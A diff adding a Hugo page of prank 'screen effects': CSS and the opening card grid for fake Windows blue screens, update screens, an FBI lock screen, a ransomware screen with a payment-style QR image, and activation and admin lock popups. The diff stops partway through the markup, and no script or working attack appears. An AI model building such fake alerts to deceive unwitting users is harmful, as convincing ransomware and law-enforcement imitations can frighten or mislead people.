@@ -1,0 +1,1007 @@
+{{ define "main" }}
+<style>
+/* ===== 屏幕特效页面 ===== */
+.main-wrapper:has(#screeneffects-page) .container{max-width:100%!important;padding-left:40px!important;padding-right:40px!important}
+.screeneffects-page{max-width:1480px;margin:0 auto 24px;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
+
+.screeneffects-page-header{text-align:center;height:160px;max-height:160px;overflow:hidden;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:28px 24px;background:linear-gradient(135deg,#0f172a 0%,#1e293b 50%,#0f172a 100%);border-radius:20px;margin-bottom:22px;box-shadow:0 4px 20px rgba(0,0,0,.15);position:relative;border:1px solid rgba(99,102,241,.15)}
+.screeneffects-page-header::before{content:'';position:absolute;top:-60%;left:-30%;width:200%;height:200%;background:radial-gradient(circle at 30% 40%,rgba(99,102,241,.1) 0%,transparent 55%);pointer-events:none}
+.screeneffects-page-title{font-size:2rem;font-weight:800;color:#f1f5f9;margin:0 0 8px;display:inline-flex;align-items:center;gap:12px;position:relative;z-index:1}
+.screeneffects-title-icon{font-size:1.4em;color:#818cf8;animation:se-icon-glow 2.5s ease-in-out infinite;display:inline-block}
+@keyframes se-icon-glow{0%,100%{filter:drop-shadow(0 0 4px rgba(129,140,248,.4))}50%{filter:drop-shadow(0 0 12px rgba(129,140,248,.8))}}
+.screeneffects-page-subtitle{font-size:.95rem;color:#94a3b8;margin:0;line-height:1.6;position:relative;z-index:1}
+
+.se-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:24px}
+.se-card{position:relative;border-radius:14px;overflow:hidden;cursor:pointer;transition:all .3s cubic-bezier(.4,0,.2,1);border:1px solid var(--border-color,#e5e7eb);background:var(--bg-primary,#fff);box-shadow:0 1px 6px rgba(0,0,0,.04)}
+.se-card:hover{transform:translateY(-4px);box-shadow:0 8px 30px rgba(0,0,0,.12);border-color:transparent}
+.se-card-preview{height:184px;position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center}
+.se-card-label{position:absolute;bottom:0;left:0;right:0;padding:14px 16px;background:linear-gradient(transparent,rgba(0,0,0,.75));z-index:2}
+.se-card-name{font-size:1rem;font-weight:700;color:#fff;margin:0}
+.se-card-desc{font-size:.8rem;color:rgba(255,255,255,.7);margin:3px 0 0}
+.se-card-icon{font-size:48px;opacity:.85}
+
+.se-preview-bsod{background:#0078d7}
+.se-preview-winupdate{background:linear-gradient(135deg,#0078d4,#005a9e)}
+.se-preview-macupdate{background:linear-gradient(135deg,#f5f5f7,#e8e8ed)}
+.se-preview-matrix{background:#0a0a0a}
+.se-preview-hacker{background:#0d0d0d}
+.se-preview-whitenoise{background:linear-gradient(135deg,#1a1a2e,#16213e)}
+.se-preview-fbi{background:#1a1a1a}
+.se-preview-broken{background:linear-gradient(135deg,#1e293b,#334155)}
+.se-preview-dvd{background:#000}
+.se-preview-crt{background:#0a0a0a}
+.se-preview-glitch{background:linear-gradient(135deg,#ff0066,#00ffff)}
+.se-preview-starfield{background:#000}
+.se-preview-fire{background:linear-gradient(135deg,#1a0000,#3d0000)}
+.se-preview-loading{background:linear-gradient(135deg,#f8fafc,#e2e8f0)}
+.se-preview-bsod11{background:linear-gradient(180deg,#0056fe,#0043c8)}
+.se-preview-chkdsk{background:#000}
+.se-preview-ransom{background:#111}
+.se-preview-winactivate{background:linear-gradient(135deg,#2d3748,#4a5568)}
+.se-preview-netadmin{background:linear-gradient(135deg,#222,#000)}
+.se-preview-rgboffset{background:linear-gradient(135deg,#ff0000,#00ff00,#0000ff)}
+.se-preview-coldscreen{background:#1a202c}
+.se-preview-vhs{background:#2d1b00}
+.se-preview-office{background:linear-gradient(135deg,#e74c3c,#c0392b)}
+.se-preview-bios{background:#000}
+.se-preview-android{background:linear-gradient(135deg,#3ddc84,#00875a)}
+.se-preview-linuxpanic{background:#000}
+.se-preview-cmdping{background:#000}
+.se-preview-solitaire{background:linear-gradient(135deg,#1a237e,#3949ab)}
+.se-preview-batterylow{background:linear-gradient(135deg,#4a1d1d,#2d1313)}
+.se-preview-404{background:linear-gradient(135deg,#212121,#424242)}
+.se-preview-diskfull{background:linear-gradient(135deg,#6d28d9,#4c1d95)}
+
+[data-theme="dark"] .screeneffects-page-header{background:linear-gradient(135deg,#020617 0%,#0f172a 50%,#020617 100%);border-color:rgba(99,102,241,.2)}
+[data-theme="dark"] .se-card{background:var(--bg-primary,#1e293b);border-color:var(--border-color,#334155)}
+[data-theme="dark"] .se-card:hover{border-color:transparent}
+
+/* ===== 全屏效果层 ===== */
+.se-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;display:none;overflow:hidden;background:#000}
+.se-overlay.active{display:block}
+.se-overlay *{box-sizing:border-box}
+.se-exit-hint{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);padding:10px 24px;background:rgba(0,0,0,.7);color:rgba(255,255,255,.9);border-radius:24px;font-size:.82rem;z-index:100000;pointer-events:none;opacity:0;transition:opacity .5s;backdrop-filter:blur(8px);font-family:-apple-system,sans-serif;letter-spacing:.5px}
+.se-exit-hint.show{opacity:1}
+
+/* BSOD 蓝屏 */
+.se-bsod{width:100%;height:100%;background:#0078d7;display:flex;align-items:flex-start;justify-content:center;flex-direction:column;color:#fff;font-family:"Segoe UI",-apple-system,Tahoma,sans-serif;padding:8% 12%;letter-spacing:0.2px}
+.se-bsod-sad{font-size:min(15vw,160px);font-weight:100;margin:0 0 24px;line-height:1}
+.se-bsod-title{font-size:min(3.2vw,32px);margin:0 0 32px;line-height:1.5;font-weight:400}
+.se-bsos-qrcode{width:120px;height:120px;background:url(https://img.zhengquan.xyz/assets/images/reward/1780019368) center/contain no-repeat;margin-bottom:20px;border-radius:4px;display:flex;align-items:center;justify-content:center;color:#0078d7;font-size:12px;font-weight:600;text-align:center;line-height:1.2;padding:4px}
+.se-bsod-detail{font-size:min(2vw,17px);line-height:1.9;max-width:720px}
+.se-bsod-progress{font-size:min(2.2vw,20px);margin-top:32px}
+
+/* Windows Update */
+.se-winupdate{width:100%;height:100%;background:#0078d4;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#fff;font-family:"Segoe UI",-apple-system,sans-serif}
+.se-winupdate-icon{font-size:72px;margin-bottom:36px;animation:se-spin 2s linear infinite}
+@keyframes se-spin{to{transform:rotate(360deg)}}
+.se-winupdate-title{font-size:26px;margin:0 0 12px;font-weight:400;letter-spacing:0.3px}
+.se-winupdate-subtitle{font-size:15px;opacity:.9;margin:0 0 36px;text-align:center;line-height:1.6}
+.se-winupdate-bar{width:340px;height:6px;background:rgba(255,255,255,.18);border-radius:3px;overflow:hidden}
+.se-winupdate-bar-inner{height:100%;background:#fff;border-radius:3px;width:0;transition:width .35s ease}
+.se-winupdate-percent{font-size:15px;margin-top:12px;opacity:.9}
+
+/* Win11 蓝屏 */
+.se-bsod11{width:100%;height:100%;background:linear-gradient(180deg,#0056fe,#0043c8);display:flex;align-items:flex-start;justify-content:center;flex-direction:column;color:#fff;font-family:"Segoe UI",sans-serif;padding:8% 12%}
+.se-bsod11-sad{font-size:min(14vw,150px);font-weight:200;margin:0 0 24px;line-height:1}
+.se-bsod11-title{font-size:min(3.2vw,32px);margin:0 0 28px;font-weight:400;line-height:1.4}
+.se-bsod11-qrcode{width:120px;height:120px;background:url(https://img.zhengquan.xyz/assets/images/reward/1780019368) center/contain no-repeat;border-radius:4px;margin-bottom:20px}
+.se-bsod11-detail{font-size:min(2vw,17px);line-height:1.9;max-width:720px;opacity:.95}
+.se-bsod11-progress{font-size:min(2.2vw,20px);margin-top:30px}
+
+
+/* macOS Update */
+.se-macupdate{width:100%;height:100%;background:#ffffff;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#000000;font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display",sans-serif}
+.se-macupdate-icon{font-size:64px;margin-bottom:28px;color:#007aff;opacity:.9}
+.se-macupdate-title{font-size:22px;font-weight:600;margin:0 0 10px;color:#000000;letter-spacing:0.2px}
+.se-macupdate-subtitle{font-size:15px;color:#86868b;margin:0 0 28px}
+.se-macupdate-bar{width:290px;height:8px;background:#f0f0f0;border-radius:4px;overflow:hidden}
+.se-macupdate-bar-inner{height:100%;background:#007aff;border-radius:4px;width:0;transition:width .35s ease}
+.se-macupdate-time{font-size:14px;color:#86868b;margin-top:16px}
+
+/* Matrix */
+.se-matrix{width:100%;height:100%;background:#000;position:relative;overflow:hidden}
+.se-matrix canvas{display:block;width:100%;height:100%}
+
+/* Hacker Terminal */
+.se-hacker{width:100%;height:100%;background:#0c0c0c;padding:24px 32px;font-family:"SF Mono","Menlo","Courier New",monospace;color:#00ff41;overflow-y:auto;overflow-x:hidden}
+.se-hacker-line{font-size:15px;line-height:1.8;white-space:pre-wrap;word-break:break-all}
+.se-hacker-cursor{display:inline-block;width:10px;height:18px;background:#00ff41;animation:se-blink 1s step-end infinite;vertical-align:middle;margin-left:2px}
+@keyframes se-blink{0%,100%{opacity:1}50%{opacity:0}}
+.se-hacker-prompt{color:#00cc33}
+.se-hacker-output{color:#33cc66}
+.se-hacker-warn{color:#ffcc00}
+.se-hacker-error{color:#ff3333}
+.se-hacker-success{color:#00ffaa}
+
+/* White Noise */
+.se-whitenoise{width:100%;height:100%;background:#000;position:relative;overflow:hidden}
+.se-whitenoise canvas{position:absolute;top:0;left:0;width:100%;height:100%}
+.se-whitenoise-info{position:absolute;top:0;left:0;width:100%;height:100%;z-index:2;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff}
+.se-whitenoise-title{font-size:34px;font-weight:300;margin:0 0 10px;letter-spacing:3px}
+.se-whitenoise-subtitle{font-size:15px;opacity:.6;margin:0 0 32px}
+.se-whitenoise-controls{display:flex;gap:14px;align-items:center;justify-content:center}
+.se-whitenoise-btn{padding:11px 28px;border:1px solid rgba(255,255,255,.25);border-radius:24px;background:rgba(255,255,255,.05);color:#fff;font-size:.85rem;cursor:pointer;transition:all .24s;backdrop-filter:blur(6px)}
+.se-whitenoise-btn:hover{background:rgba(255,255,255,.14)}
+.se-whitenoise-btn.active{background:rgba(255,255,255,.22);border-color:rgba(255,255,255,.6)}
+
+/* FBI Lock */
+.se-fbi{width:100%;height:100%;background:linear-gradient(180deg,#0a0a0a,#141414);display:flex;align-items:center;justify-content:center;flex-direction:column;color:#fff;text-align:center;padding:40px}
+.se-fbi-seal{width:130px;height:130px;border:4px solid #c5a44e;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:28px;font-size:14px;font-weight:700;color:#c5a44e;letter-spacing:1px;line-height:1.3}
+.se-fbi-title{font-size:28px;font-weight:700;color:#dc2626;margin:0 0 20px;font-family:"Arial Black",sans-serif;letter-spacing:2px}
+.se-fbi-text{font-size:15px;line-height:1.9;max-width:680px;color:#e5e7eb;margin:0 0 24px;font-family:"Segoe UI",sans-serif}
+.se-fbi-warning{font-size:12px;color:#6b7280;max-width:520px;line-height:1.6;font-family:-apple-system,sans-serif}
+
+/* Broken Screen */
+.se-broken{width:100%;height:100%;position:relative;overflow:hidden}
+.se-broken canvas{position:absolute;top:0;left:0;width:100%;height:100%}
+
+/* DVD Bounce */
+.se-dvd{width:100%;height:100%;background:#000;position:relative;overflow:hidden}
+.se-dvd-logo{position:absolute;font-size:68px;font-weight:900;color:#fff;will-change:left,top;user-select:none;font-family:Arial,Helvetica,sans-serif;letter-spacing:4px;text-shadow:0 0 12px rgba(255,255,255,.35)}
+
+/* CRT */
+.se-crt{width:100%;height:100%;background:#0a0a0a;position:relative;overflow:hidden}
+.se-crt canvas{position:absolute;top:0;left:0;width:100%;height:100%}
+.se-crt-scanlines{position:absolute;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,.2) 0px,rgba(0,0,0,.2) 1px,transparent 1px,transparent 3px);pointer-events:none;z-index:2}
+.se-crt-vignette{position:absolute;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,.75) 100%);pointer-events:none;z-index:3}
+.se-crt-flicker{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:4;animation:se-flicker .15s infinite;opacity:0}
+@keyframes se-flicker{0%{opacity:.03}50%{opacity:0}100%{opacity:.015}}
+
+/* Glitch */
+.se-glitch{width:100%;height:100%;background:#000;position:relative;overflow:hidden}
+.se-glitch canvas{position:absolute;top:0;left:0;width:100%;height:100%}
+
+/* Starfield */
+.se-starfield{width:100%;height:100%;background:#000;position:relative;overflow:hidden}
+.se-starfield canvas{display:block;width:100%;height:100%}
+
+/* Fire */
+.se-fire{width:100%;height:100%;background:#000;position:relative;overflow:hidden}
+.se-fire canvas{display:block;width:100%;height:100%}
+
+/* Loading */
+.se-loading{width:100%;height:100%;background:#f5f5f7;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#1d1d1f;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
+.se-loading-spinner{width:52px;height:52px;border:4px solid #e5e5ea;border-top-color:#007aff;border-radius:50%;animation:se-spin .8s linear infinite;margin-bottom:28px}
+.se-loading-text{font-size:16px;color:#1d1d1f;margin:0 0 10px;font-weight:500}
+.se-loading-sub{font-size:13px;color:#86868b;margin:0 0 28px}
+.se-loading-bar{width:340px;height:4px;background:#e5e5ea;border-radius:2px;overflow:hidden}
+.se-loading-bar-inner{height:100%;background:#007aff;border-radius:2px;width:0;transition:width .25s ease}
+.se-loading-detail{font-size:12px;color:#86868b;margin-top:16px}
+
+/* ====================== 新增特效 ====================== */
+
+/* CHKDSK */
+.se-chkdsk{width:100%;height:100%;background:#000;color:#00ccff;padding:30px;font-family:Consolas,"Courier New",monospace;overflow-y:auto;line-height:1.6;font-size:15px}
+.se-chkdsk-title{color:#fff;font-weight:bold;margin-bottom:12px}
+.se-chkdsk-progress{color:#00ff00;margin:8px 0}
+.se-chkdsk-error{color:#ff3333}
+.se-chkdsk-info{color:#99ccff}
+
+/* 勒索病毒 */
+.se-ransom{width:100%;height:100%;background:#111;color:#fff;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:40px;font-family:"Segoe UI",sans-serif}
+.se-ransom-icon{font-size:70px;color:#ff3333;margin-bottom:24px}
+.se-ransom-title{font-size:32px;color:#ff3333;font-weight:700;margin:0 0 16px;letter-spacing:1px}
+.se-ransom-text{font-size:16px;max-width:700px;line-height:1.8;margin:0 0 28px;color:#eee}
+.se-ransom-qr{width:160px;height:160px;background:url(https://img.zhengquan.xyz/assets/images/reward/1780019368) center/contain no-repeat;border-radius:6px;margin-bottom:20px}
+.se-ransom-tip{font-size:14px;color:#ccc;margin-top:12px}
+
+/* Windows 激活锁 */
+.se-winactivate{width:100%;height:100%;background:#f8f9fa;position:relative;font-family:"Segoe UI",sans-serif;overflow:hidden}
+.se-winactivate-watermark{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) rotate(-45deg);font-size:min(10vw,80px);font-weight:900;color:rgba(0,0,0,.05);pointer-events:none;z-index:1}
+.se-winactivate-popup{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:min(500px,90%);background:#fff;border:1px solid #e0e0e0;border-radius:8px;box-shadow:0 10px 30px rgba(0,0,0,.2);padding:30px;z-index:2}
+.se-winactivate-icon{font-size:48px;color:#ffc107;margin-bottom:20px;text-align:center}
+.se-winactivate-title{font-size:22px;font-weight:600;color:#212529;margin:0 0 12px;text-align:center}
+.se-winactivate-desc{font-size:15px;color:#6c757d;line-height:1.6;margin:0 0 24px;text-align:center}
+.se-winactivate-btn{display:block;width:100%;padding:12px;text-align:center;background:#007bff;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer;margin-bottom:12px}
+.se-winactivate-btn:hover{background:#0056b3}
+.se-winactivate-link{color:#007bff;text-align:center;display:block;font-size:14px}
+
+/* 网管锁定 */
+.se-netadmin{width:100%;height:100%;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center;font-family:"Segoe UI",sans-serif}
+.se-netadmin-popup{width:min(550px,90%);background:#222;border:2px solid #dc3545;border-radius:8px;padding:40px;text-align:center}
+.se-netadmin-icon{font-size:64px;color:#dc3545;margin-bottom:20px}
+.se-netadmin-title{font-size:24px;font-weight:700;color:#fff;margin:0 0 16px;letter-spacing:1px}
+.se-netadmin-text{font-size:16px;color:#ddd;line-height:1.8;margin:0 0 24px}
+.se-netadmin-signature{font-size:14px;color:#999;font-style:italic;margin-top:20px}
+
+/* RGB 色彩偏移 */
+.se-rgboffset{width:100%;height:100%;background:#000;position:relative;overflow:hidden}
+.se-rgboffset-layer{position:absolute;top:0;left:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-size:min(12vw,100px);font-weight:900;color:#fff;opacity:.8}
+.se-rgboffset-red{color:red;transform:translateX(-8px);z-index:1}
+.se-rgboffset-green{color:lime;transform:translateX(0);z-index:2}
+.se-rgboffset-blue{color:blue;transform:translateX(8px);z-index:3}
+.se-rgboffset-noise{position:absolute;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(90deg,rgba(255,255,255,.02) 0px,rgba(255,255,255,.02) 1px,transparent 1px,transparent 4px);z-index:4;animation:se-rgb-shift 0.3s infinite alternate}
+@keyframes se-rgb-shift{0%{opacity:.5}100%{opacity:.8}}
+
+/* 低温屏幕故障 */
+.se-coldscreen{width:100%;height:100%;background:#1a202c;position:relative;overflow:hidden}
+.se-coldscreen-lines{position:absolute;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(255,255,255,.05) 0px,rgba(255,255,255,.05) 2px,transparent 2px,transparent 6px);animation:se-cold-flicker 0.1s infinite alternate, se-line-scroll 8s linear infinite}
+.se-coldscreen-text{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;font-size:24px;text-align:center;font-family:monospace;opacity:.7}
+@keyframes se-cold-flicker{0%{opacity:.8}100%{opacity:.4}}
+@keyframes se-line-scroll{0%{background-position:0 0}100%{background-position:0 100px}}
+
+/* VHS 录像带 */
+.se-vhs{width:100%;height:100%;background:#2d1b00;position:relative;overflow:hidden}
+.se-vhs-noise{position:absolute;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(255,255,255,.08) 0px,rgba(255,255,255,.08) 1px,transparent 1px,transparent 2px);animation:se-vhs-scroll 0.1s infinite linear, se-vhs-flicker 0.5s infinite alternate}
+.se-vhs-distortion{position:absolute;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at center,transparent 70%,rgba(0,0,0,.3) 100%);animation:se-vhs-distort 2s infinite alternate}
+.se-vhs-text{position:absolute;bottom:40px;left:50%;transform:translateX(-50%);color:#fff;font-size:18px;font-family:monospace;letter-spacing:2px;opacity:.6}
+@keyframes se-vhs-scroll{0%{background-position:0 0}100%{background-position:0 4px}}
+@keyframes se-vhs-flicker{0%{opacity:.7}100%{opacity:.9}}
+@keyframes se-vhs-distort{0%{transform:skewX(0deg)}50%{transform:skewX(2deg)}100%{transform:skewX(-1deg)}}
+
+/* Office 安装 */
+.se-office{width:100%;height:100%;background:#e74c3c;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#fff;font-family:"Segoe UI",sans-serif}
+.se-office-logo{font-size:72px;margin-bottom:30px}
+.se-office-title{font-size:26px;margin:0 0 12px;font-weight:400}
+.se-office-subtitle{font-size:15px;opacity:.9;margin:0 0 36px;text-align:center}
+.se-office-bar{width:400px;height:8px;background:rgba(255,255,255,.2);border-radius:4px;overflow:hidden}
+.se-office-bar-inner{height:100%;background:#fff;border-radius:4px;width:0;transition:width .35s ease}
+.se-office-percent{font-size:15px;margin-top:16px;opacity:.9}
+
+/* BIOS 自检 */
+.se-bios{width:100%;height:100%;background:#000;color:#00ff00;padding:20px;font-family:Courier New,monospace;font-size:14px;line-height:1.5;overflow-y:auto}
+.se-bios-line{margin:4px 0}
+.se-bios-success{color:#00ff00}
+.se-bios-warning{color:#ffff00}
+.se-bios-error{color:#ff0000}
+.se-bios-header{font-weight:bold;margin-bottom:15px;color:#fff}
+
+/* 安卓刷机 */
+.se-android{width:100%;height:100%;background:#fff;display:flex;align-items:center;justify-content:center;flex-direction:column}
+.se-android-logo{font-size:80px;color:#3ddc84;margin-bottom:30px}
+.se-android-text{font-size:18px;color:#00875a;font-weight:500;margin-bottom:24px;text-align:center;font-family:Roboto,sans-serif}
+.se-android-bar{width:300px;height:4px;background:#e0e0e0;border-radius:2px;overflow:hidden}
+.se-android-bar-inner{height:100%;background:#3ddc84;border-radius:2px;width:0;transition:width .3s ease}
+.se-android-detail{font-size:14px;color:#666;margin-top:16px}
+
+/* Linux 宕机 */
+.se-linuxpanic{width:100%;height:100%;background:#000;color:#fff;padding:20px;font-family:monospace;font-size:14px;line-height:1.5;overflow-y:auto}
+.se-linuxpanic-header{color:#ff6b6b;font-weight:bold;margin-bottom:10px}
+.se-linuxpanic-line{margin:2px 0}
+.se-linuxpanic-error{color:#ff6b6b}
+.se-linuxpanic-info{color:#4ecdc4}
+
+/* CMD Ping */
+.se-cmdping{width:100%;height:100%;background:#000;color:#00ff00;padding:15px;font-family:Consolas,monospace;font-size:15px;overflow-y:auto}
+.se-cmdping-prompt{color:#00ff00}
+.se-cmdping-output{margin:5px 0}
+
+/* Windows 纸牌 */
+.se-solitaire{width:100%;height:100%;background:linear-gradient(135deg,#1a237e,#3949ab);display:flex;align-items:center;justify-content:center;flex-direction:column;color:#fff;font-family:"Segoe UI",sans-serif}
+.se-solitaire-card{width:120px;height:170px;background:#fff;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:48px;color:#1a237e;font-weight:bold;margin-bottom:20px;box-shadow:0 4px 10px rgba(0,0,0,.3);animation:se-card-float 3s ease-in-out infinite}
+.se-solitaire-text{font-size:22px;margin-bottom:10px}
+@keyframes se-card-float{0%,100%{transform:translateY(0)}50%{transform:translateY(-15px)}}
+
+/* 电量低黑屏 */
+.se-batterylow{width:100%;height:100%;background:#000;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#fff;font-family:"Segoe UI",sans-serif;position:relative}
+.se-batterylow-icon{font-size:80px;color:#ff3333;margin-bottom:30px}
+.se-batterylow-percent{font-size:48px;font-weight:bold;margin-bottom:20px;animation:se-battery-pulse 1s infinite alternate}
+.se-batterylow-text{font-size:20px;opacity:.8}
+.se-batterylow-fade{position:absolute;top:0;left:0;width:100%;height:100%;background:#000;opacity:0;animation:se-battery-fade 8s forwards}
+@keyframes se-battery-pulse{0%{opacity:1}100%{opacity:.6}}
+@keyframes se-battery-fade{0%{opacity:0}100%{opacity:.95}}
+
+/* 404 */
+.se-404{width:100%;height:100%;background:#f8f9fa;display:flex;align-items:center;justify-content:center;flex-direction:column;font-family:"Segoe UI",sans-serif}
+.se-404-code{font-size:min(20vw,180px);font-weight:900;color:#343a40;margin:0 0 20px;line-height:1}
+.se-404-title{font-size:28px;font-weight:600;color:#343a40;margin:0 0 12px}
+.se-404-desc{font-size:16px;color:#6c757d;margin:0 0 30px;text-align:center;max-width:600px;line-height:1.6}
+.se-404-btn{padding:12px 24px;background:#007bff;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
+.se-404-btn:hover{background:#0056b3}
+
+/* 磁盘爆满 */
+.se-diskfull{width:100%;height:100%;background:rgba(0,0,0,.8);display:flex;align-items:center;justify-content:center;font-family:"Segoe UI",sans-serif}
+.se-diskfull-popup{width:min(600px,90%);background:#fff;border-radius:8px;padding:30px;box-shadow:0 10px 30px rgba(0,0,0,.3)}
+.se-diskfull-icon{font-size:56px;color:#dc3545;margin-bottom:20px;text-align:center}
+.se-diskfull-title{font-size:24px;font-weight:700;color:#dc3545;margin:0 0 16px;text-align:center}
+.se-diskfull-text{font-size:16px;color:#343a40;line-height:1.8;margin:0 0 24px}
+.se-diskfull-bar{width:100%;height:10px;background:#e9ecef;border-radius:5px;overflow:hidden;margin-bottom:16px}
+.se-diskfull-bar-inner{height:100%;background:#dc3545;border-radius:5px;width:98%}
+.se-diskfull-usage{font-size:14px;color:#6c757d;text-align:right;margin-bottom:24px}
+.se-diskfull-btn{display:block;width:100%;padding:12px;text-align:center;background:#dc3545;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
+.se-diskfull-btn:hover{background:#c82333}
+
+@media(max-width:900px){
+  .main-wrapper:has(#screeneffects-page) .container{padding-left:16px!important;padding-right:16px!important}
+  .screeneffects-page-header{height:160px}
+  .se-grid{grid-template-columns:repeat(3,1fr);gap:12px}
+}
+@media(max-width:600px){
+  .main-wrapper:has(#screeneffects-page) .container{padding-left:12px!important;padding-right:12px!important}
+  .screeneffects-page-header{height:140px}
+  .se-grid{grid-template-columns:repeat(2,1fr);gap:10px}
+}
+</style>
+
+<div class="screeneffects-page" id="screeneffects-page">
+  <div class="screeneffects-page-header">
+    <h1 class="screeneffects-page-title"><span class="screeneffects-title-icon"><i class="fas fa-desktop"></i></span> 屏幕特效</h1>
+    <p class="screeneffects-page-subtitle">趣味屏幕特效 — 蓝屏、更新、黑客帝国、碎屏等恶作剧效果</p>
+  </div>
+
+  <div class="se-grid">
+    <div class="se-card" data-effect="bsod"><div class="se-card-preview se-preview-bsod"><div class="se-card-icon" style="color:#fff">:(</div><div class="se-card-label"><h3 class="se-card-name">经典蓝屏</h3><p class="se-card-desc">Windows BSOD 蓝屏死机</p></div></div></div>
+    <div class="se-card" data-effect="winupdate"><div class="se-card-preview se-preview-winupdate"><div class="se-card-icon" style="color:#fff"><i class="fas fa-sync-alt"></i></div><div class="se-card-label"><h3 class="se-card-name">Windows 更新</h3><p class="se-card-desc">请勿关闭计算机</p></div></div></div>
+    <div class="se-card" data-effect="bsod11"><div class="se-card-preview se-preview-bsod11"><div class="se-card-icon" style="color:#fff">:(</div><div class="se-card-label"><h3 class="se-card-name">Win11 新版蓝屏</h3><p class="se-card-desc">Windows 11 全新蓝屏样式</p></div></div></div>
+    <div class="se-card" data-effect="macupdate"><div class="se-card-preview se-preview-macupdate"><div class="se-card-icon" style="color:#007aff"><i class="fab fa-apple"></i></div><div class="se-card-label"><h3 class="se-card-name">macOS 更新</h3><p class="se-card-desc">Apple 风格系统更新</p></div></div></div>
+    <div class="se-card" data-effect="matrix"><div class="se-card-preview se-preview-matrix"><div class="se-card-icon" style="color:#00ff41;font-family:monospace;font-size:32px">01101</div><div class="se-card-label"><h3 class="se-card-name">黑客帝国数字雨</h3><p class="se-card-desc">Matrix 数字雨下落</p></div></div></div>
+    <div class="se-card" data-effect="hacker"><div class="se-card-preview se-preview-hacker"><div class="se-card-icon" style="color:#00ff41;font-family:monospace;font-size:32px">>_</div><div class="se-card-label"><h3 class="se-card-name">黑客终端</h3><p class="se-card-desc">模拟黑客入侵界面</p></div></div></div>
+    <div class="se-card" data-effect="whitenoise"><div class="se-card-preview se-preview-whitenoise"><div class="se-card-icon" style="color:#a78bfa"><i class="fas fa-volume-up"></i></div><div class="se-card-label"><h3 class="se-card-name">睡眠白噪音</h3><p class="se-card-desc">助眠白噪音+静态画面</p></div></div></div>
+    <div class="se-card" data-effect="fbi"><div class="se-card-preview se-preview-fbi"><div class="se-card-icon" style="color:#dc2626"><i class="fas fa-shield-alt"></i></div><div class="se-card-label"><h3 class="se-card-name">FBI 锁定屏幕</h3><p class="se-card-desc">FBI 警告锁定恶作剧</p></div></div></div>
+    <div class="se-card" data-effect="broken"><div class="se-card-preview se-preview-broken"><div class="se-card-icon" style="color:#94a3b8"><i class="fas fa-bolt"></i></div><div class="se-card-label"><h3 class="se-card-name">碎屏效果</h3><p class="se-card-desc">逼真屏幕碎裂</p></div></div></div>
+    <div class="se-card" data-effect="dvd"><div class="se-card-preview se-preview-dvd"><div class="se-card-icon" style="color:#f59e0b;font-weight:900;font-size:32px">DVD</div><div class="se-card-label"><h3 class="se-card-name">DVD 屏保</h3><p class="se-card-desc">经典弹跳屏保</p></div></div></div>
+    <div class="se-card" data-effect="crt"><div class="se-card-preview se-preview-crt"><div class="se-card-icon" style="color:#33ff33"><i class="fas fa-tv"></i></div><div class="se-card-label"><h3 class="se-card-name">CRT 显示器</h3><p class="se-card-desc">复古扫描线+闪烁</p></div></div></div>
+    <div class="se-card" data-effect="glitch"><div class="se-card-preview se-preview-glitch"><div class="se-card-icon" style="color:#fff"><i class="fas fa-exclamation-triangle"></i></div><div class="se-card-label"><h3 class="se-card-name">故障效果</h3><p class="se-card-desc">赛博朋克屏幕故障</p></div></div></div>
+    <div class="se-card" data-effect="starfield"><div class="se-card-preview se-preview-starfield"><div class="se-card-icon" style="color:#fff"><i class="fas fa-star"></i></div><div class="se-card-label"><h3 class="se-card-name">星空穿越</h3><p class="se-card-desc">星际穿越星空屏保</p></div></div></div>
+    <div class="se-card" data-effect="fire"><div class="se-card-preview se-preview-fire"><div class="se-card-icon" style="color:#ff6600"><i class="fas fa-fire"></i></div><div class="se-card-label"><h3 class="se-card-name">火焰效果</h3><p class="se-card-desc">逼真像素火焰</p></div></div></div>
+    <div class="se-card" data-effect="loading"><div class="se-card-preview se-preview-loading"><div class="se-card-icon" style="color:#666"><i class="fas fa-spinner"></i></div><div class="se-card-label"><h3 class="se-card-name">假加载画面</h3><p class="se-card-desc">永远加载不完</p></div></div></div>
+
+    <div class="se-card" data-effect="chkdsk"><div class="se-card-preview se-preview-chkdsk"><div class="se-card-icon" style="color:#00ccff;font-family:monospace">CHKDSK</div><div class="se-card-label"><h3 class="se-card-name">磁盘自检</h3><p class="se-card-desc">Windows CHKDSK 开机检测</p></div></div></div>
